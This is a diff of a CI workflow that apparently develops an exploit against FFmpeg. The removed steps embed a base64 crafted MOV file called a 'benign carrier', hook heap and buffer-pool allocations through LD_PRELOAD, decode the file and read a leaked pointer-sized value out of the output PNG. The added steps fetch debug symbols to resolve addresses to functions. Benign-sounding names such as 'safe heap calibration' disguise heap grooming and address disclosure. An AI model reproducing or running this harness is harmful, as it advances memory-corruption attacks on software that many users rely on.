@@ -1,4 +1,4 @@
-name: Temporary FFmpeg safe heap calibration
+name: Temporary exact allocation symbol map
 on:
   push:
     branches:
@@ -6,106 +6,23 @@ on:
 permissions:
   contents: read
 jobs:
-  calibrate:
+  map:
     runs-on: ubuntu-24.04
     steps:
-      - name: Reproduce benign MagicYUV TIFF carrier
+      - name: Resolve FFmpeg 6.1.1 allocation callers
         shell: bash
         run: |
           set -euo pipefail
           sudo apt-get update -qq
-          sudo DEBIAN_FRONTEND=noninteractive apt-get install -y -qq ffmpeg build-essential python3
-          cat > /tmp/sameinv.b64 <<'B64'
-AAAAFGZ0eXBxdCAgAAACAHF0ICAAAAAId2lkZQAABFttZGF0TUFHWSAAAAAHaQwAAAAgAAgAAAAIAAAACAAAAAIAAABBAwAAQQMAAF0DAAB5AwAAlQMAAE0DAABpAwAAhQMAAKEDAABVAwAAcQMAAI0DAACpAwAAAwADBgkBBAcKAgUICwQICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAcICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAkGCAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgHCAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICQkJCQkJCQgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgJBggICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICQkJCQkJCQgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIBwgICAgICAgICAgICAgI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
-B64
-          base64 -d /tmp/sameinv.b64 > /tmp/sameinv.mov
-          echo '=== versions ==='
-          ffmpeg -version | head -n 5
-          ffprobe -v error -show_streams -of compact /tmp/sameinv.mov || true
-
-          cat >/tmp/hook.c <<'C'
-#define _GNU_SOURCE
-#include <dlfcn.h>
-#include <stdint.h>
-#include <stdio.h>
-#include <stdlib.h>
-#include <pthread.h>
-#include <stdatomic.h>
-
-typedef struct AVBuffer AVBuffer;
-typedef struct AVBufferRef { AVBuffer *buffer; uint8_t *data; size_t size; } AVBufferRef;
-struct AVBuffer {
-    uint8_t *data; size_t size; atomic_uint refcount;
-    void (*free_cb)(void*,uint8_t*); void *opaque; int flags; int flags_internal;
-};
-static __thread int busy;
-static int (*real_posix_memalign)(void **, size_t, size_t);
-static void (*real_free)(void *);
-static AVBufferRef *(*real_pool_get)(void *);
-static void (*real_unref)(AVBufferRef **);
-
-static void init_syms(void){
-  if(!real_posix_memalign) real_posix_memalign=dlsym(RTLD_NEXT,"posix_memalign");
-  if(!real_free) real_free=dlsym(RTLD_NEXT,"free");
-  if(!real_pool_get) real_pool_get=dlsym(RTLD_NEXT,"av_buffer_pool_get");
-  if(!real_unref) real_unref=dlsym(RTLD_NEXT,"av_buffer_unref");
-}
-int posix_memalign(void **p,size_t a,size_t n){
-  init_syms(); int r=real_posix_memalign(p,a,n);
-  if(!busy && r==0 && (n==80 || n==88 || n<2048)){ busy=1; fprintf(stderr,"PMEM n=%zu a=%zu p=%p\n",n,a,*p); busy=0; }
-  return r;
-}
-void free(void *p){
-  init_syms();
-  if(!busy && p){ busy=1; fprintf(stderr,"FREE p=%p\n",p); busy=0; }
-  real_free(p);
-}
-AVBufferRef *av_buffer_pool_get(void *pool){
-  init_syms(); AVBufferRef *r=real_pool_get(pool);
-  if(r && !busy){
-    busy=1;
-    struct AVBuffer *b=(struct AVBuffer*)r->buffer;
-    fprintf(stderr,"POOLGET ref=%p buf=%p data=%p size=%zu free=%p opaque=%p\n",
-      (void*)r,(void*)b,(void*)r->data,r->size,(void*)b->free_cb,b->opaque);
-    busy=0;
-  }
-  return r;
-}
-void av_buffer_unref(AVBufferRef **pr){
-  init_syms();
-  if(pr && *pr && !busy){
-    busy=1;
-    AVBufferRef *r=*pr; struct AVBuffer *b=(struct AVBuffer*)r->buffer;
-    fprintf(stderr,"UNREF ref=%p buf=%p data=%p size=%zu free=%p opaque=%p\n",
-      (void*)r,(void*)b,(void*)r->data,r->size,(void*)b->free_cb,b->opaque);
-    busy=0;
-  }
-  real_unref(pr);
-}
-C
-          gcc -shared -fPIC -O0 -o /tmp/hook.so /tmp/hook.c -ldl -pthread
-
-          echo '=== decode ==='
-          set +e
-          LD_PRELOAD=/tmp/hook.so ffmpeg -hide_banner -loglevel error -ss 0 -i /tmp/sameinv.mov -frames:v 1 -f image2pipe -vcodec png /tmp/out.png 2>/tmp/trace.log
-          rc=$?
-          set -e
-          echo "ffmpeg_rc=$rc"
-          echo '=== png ==='
-          python3 - <<'PY'
-import struct,zlib
-p=open('/tmp/out.png','rb').read()
-print('png_len',len(p), 'sig',p[:8].hex())
-pos=8; dat=b''
-while pos+12<=len(p):
-    n=struct.unpack('>I',p[pos:pos+4])[0]; t=p[pos+4:pos+8]; d=p[pos+8:pos+8+n]
-    if t==b'IHDR': print('IHDR',struct.unpack('>IIBBBBB',d))
-    if t==b'IDAT': dat+=d
-    pos+=12+n
-if dat:
-    raw=zlib.decompress(dat)
-    print('scanline_len',len(raw),'first32',raw[:33].hex())
-    if len(raw)>=9: print('qword0',hex(int.from_bytes(raw[1:9],'little')))
-PY
-          echo '=== pool/allocation trace filtered ==='
-          grep -E 'POOLGET|UNREF|PMEM n=(80|88|5[0-9][0-9]|10[0-9][0-9]|11[0-9][0-9])' /tmp/trace.log | tail -n 300 || true
+          sudo DEBIAN_FRONTEND=noninteractive apt-get install -y -qq ffmpeg binutils wget
+          D=/tmp/codec.ddeb
+          wget -q 'https://ddebs.ubuntu.com/pool/universe/f/ffmpeg/libavcodec60-dbgsym_6.1.1-3ubuntu5_amd64.ddeb' -O "$D"
+          mkdir -p /tmp/dbg
+          dpkg-deb -x "$D" /tmp/dbg
+          DBG="$(find /tmp/dbg -type f -name '*.debug' | head -n1)"
+          echo "DBG=$DBG"
+          for a in 0x7cf6b8 0x7d4258 0x2a8525 0x6bc1e0; do
+            echo "=== $a ==="
+            addr2line -f -C -e "$DBG" "$a" || true
+            nm -an "$DBG" | awk -v x="$a" 'BEGIN{t=strtonum(x);best=-1} /^[0-9a-fA-F]+ [tTwW] /{v=strtonum("0x"$1); if(v<=t && v>best){best=v; line=$0}} END{print line}' || true
+          done
